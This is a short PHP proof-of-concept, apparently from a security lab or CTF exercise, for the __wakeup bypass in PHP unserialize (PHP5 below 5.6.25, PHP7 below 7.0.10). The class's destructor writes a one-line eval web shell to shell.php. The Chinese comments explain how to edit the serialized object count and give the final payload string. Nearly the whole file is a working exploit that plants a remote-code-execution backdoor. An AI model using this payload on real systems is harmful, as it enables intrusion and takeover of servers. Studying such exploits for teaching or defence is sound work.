<?php
// PHP5小于5.6.25或PHP7小于7.0.10
class Test
{
    private $poc = '';
    public function __construct($poc)
    {
        $this->poc = $poc;
    }
    function __destruct()
    {
        if ($this->poc != '')
        {
            file_put_contents('shell.php', '<?php eval($_POST["shell"]);?>');
                die('Success!!!');
            }
        else
        {
            die('fail to getshell!!!');
        }
    }
    function __wakeup()
    {
        foreach(get_object_vars($this) as $k => $v)
        {
            $this->$k = null;
        }
        echo "waking up...n";
    }
}
$a = new Test('shell');
$poc = serialize($a);
print($poc);
// PHP5小于5.6.25或PHP7小于7.0.10
// 1改为大于1的数字
// 将Testpoc改为%00Test%00poc
// O:4:"Test":2:{s:9:"%00Test%00poc";s:5:"shell";}